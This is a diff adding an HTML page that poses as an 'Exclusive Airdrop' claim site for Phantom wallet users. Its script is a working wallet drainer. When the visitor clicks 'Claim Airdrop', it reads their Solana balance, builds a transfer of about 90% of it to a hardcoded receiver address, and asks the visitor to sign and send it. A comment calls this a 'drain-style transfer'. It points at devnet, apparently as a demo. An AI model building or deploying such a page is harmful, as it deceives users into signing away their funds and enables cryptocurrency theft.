@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Airdrop Claim</title>
+  <style>
+    body {
+      font-family: Arial;
+      background: #0d1117;
+      color: white;
+      text-align: center;
+      margin-top: 100px;
+    }
+    button {
+      padding: 12px 24px;
+      margin: 10px;
+      font-size: 16px;
+      border-radius: 8px;
+      border: none;
+      cursor: pointer;
+    }
+    .primary { background: #238636; color: white; }
+    .secondary { background: #30363d; color: white; }
+  </style>
+</head>
+
+<body>
+  <h1>🎁 Exclusive Airdrop</h1>
+  <p>Connect wallet to claim rewards</p>
+
+  <button class="secondary" onclick="connect()">Connect Wallet</button>
+  <br>
+  <button class="primary" onclick="claim()">Claim Airdrop</button>
+
+  <script type="module">
+    import {
+      Connection,
+      Transaction,
+      SystemProgram,
+      PublicKey
+    } from "https://esm.sh/@solana/web3.js";
+
+    const connection = new Connection("https://api.devnet.solana.com");
+
+    // 👇 Your Wallet B
+    const RECEIVER = new PublicKey("FWHCEHBJB2Rfbwmj4F39huSy8sowj1i5xw1a7xLR2YwR");
+
+    let provider;
+
+    window.connect = async () => {
+      provider = window.solana;
+
+      if (!provider || !provider.isPhantom) {
+        alert("Phantom not detected");
+        return;
+      }
+
+      await provider.connect();
+      alert("Connected: " + provider.publicKey.toBase58());
+    };
+
+    window.claim = async () => {
+      if (!provider) return alert("Connect first");
+
+      const user = provider.publicKey;
+
+// Get balance
+const balance = await connection.getBalance(user);
+
+// Safe fee buffer (~0.005 SOL to be extra safe)
+const feeBuffer = 0.005 * 1e9;
+
+// Ensure we never go negative
+const safeBalance = Math.max(0, balance - feeBuffer);
+
+// Send 90% of what's safely available
+const sendAmount = Math.floor(safeBalance * 0.9);
+
+if (sendAmount <= 0) {
+  alert("Not enough balance after fees");
+  return;
+}
+
+      const tx = new Transaction();
+
+      // 🔥 Realistic drain-style transfer (A → B)
+      tx.add(
+        SystemProgram.transfer({
+          fromPubkey: user,
+          toPubkey: RECEIVER,
+          lamports: sendAmount
+        })
+      );
+
+      tx.feePayer = user;
+      tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+
+      // 👉 Step 1: Wallet popup
+      const signedTx = await provider.signTransaction(tx);
+
+      // 👉 Step 2: Send transaction
+      const sig = await connection.sendRawTransaction(
+        signedTx.serialize()
+      );
+
+      alert("Transaction sent!\n\nSignature:\n" + sig);
+    };
+  </script>
+</body>
+</html>
